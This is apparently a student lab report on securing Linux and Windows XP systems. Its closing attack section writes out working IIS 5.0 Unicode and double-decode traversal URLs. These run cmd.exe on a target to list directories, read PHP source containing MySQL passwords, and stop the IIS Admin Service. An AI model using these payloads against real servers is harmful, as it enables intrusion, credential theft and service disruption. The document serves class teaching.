System Status

Linux

System Security

            We are planning on implementing a Honeynet defense to our system. Honeynet is a high-interaction honeypot, meaning it provides real operating systems for attackers to interact with. A honeypot is a resource whose value is in being probed, attacked or compromised. The honeypot system can be use to learn a great deal about intruders, everything from how they break into systems to how they communicate and why they attack systems. Honeypots can also help uncover flaws before they're used to do any real damage on the real system. Honeynets accomplish this by building a network of systems. This network is highly contained, where all inbound and outbound traffic is both controlled and captured. Each system within the network is really a honeypot, a system designed to be attacked. When these systems are attacked, Honeynets capture all of the attacker's activity.

 

Other applications such as Webmin and Snort will be use to manage and monitor our system. Webmin is a web-based interface for system administration. Snort is a network intrusion detection system able to perform real-time traffic analysis and packet logging. Using Snort will help our team detect a variety of attacks and probes against our system.

Windows

System Security

            Some changes were made to the operating system to make it more secure. The first thing we did was to use stronger passwords for our system accounts and disabled the guest account. Some changes were made to the Local Security Settings. The Account Lockout Policy was changed to have Account Lockout duration to 30 min, Reset Account lockout counter after to 60 min and Account lockout threshold to 3 invalid logon attempts. Under Local Policies in User Rights Assignment the deny access to this computer from the network policy was set to ‘Everyone’.

 

Another way we secured our system was to disable NetBIOS to prevent other teams of using known NetBIOS exploits. The NetBIOS was disabled by reconfiguring the Advance TCP/IP Settings. We also changed the settings in the TCP/IP filtering on our Windows XP system. These changes allowed us to permit access only to port 80 and restricted access to all the other ports. We tested the TCP/IP filtering using SuperScan on our system which only showed port 80 was open. Nessus was also run to audit our system, which only found port 80 also.

 

We have also found a method to install Windows XP Service Pack 1 on our system but it hasn’t being installed yet. There is some argument of where or not we can install Service Pack 1, and how it will affect the IIS software, so it will be left for the next assignment.

Web Services

            There were no changes made to the web services since changes were not allowed. Only the IIS log file properties were changed to have extended and more detailed information. The MySQL log file was also enabled which stores all query made to the MySQL database. These log files will give us a better understanding of possible future attacks against our system.

Attack:

 

Exploit performed:

UNICODE URL exploit against IIS.

 

Application used:

            Internet Explorer

 

Success/Failure:

            This exploit was successful against the ADMIN machine. The bug in the UNICODE character set in IIS 5.0 seems to decode UNICODE at the wrong instance. This allowed obtaining directory information and some limited write access on the target machine. We were able read any directory in the system. This is an example URL for directory listing:

http://10.0.4.21/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir

 

Figure 1: IIS directory listing

 

If we need to find the directory location of the web page in the ADMIN machine we would use this URL:

http://10.0.4.21/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+/S+c:\*.php

This will list the location of all PHP files on the system. We were also able view some of the files from the ADMIN system.

http://10.0.4.21/scripts/..%255c..%255c/winnt/system32/cmd.exe?/c+type+c:\inetpub\wwwroot\discussion\index.php

This enabled us to read the contents of the PHP files on the ADMIN system. The code of the “global.php” was read and it contained the passwords for the MySQL database. We were also able to disable IIS using this URL: 

http://10.0.4.21/scripts/..%c0%af../winnt/system32/cmd.exe?/c+net+stop+"IIS+Admin+Service"

Trying this URL many times doesn’t stop the service but it makes the service non-responsive without affecting the operating system.
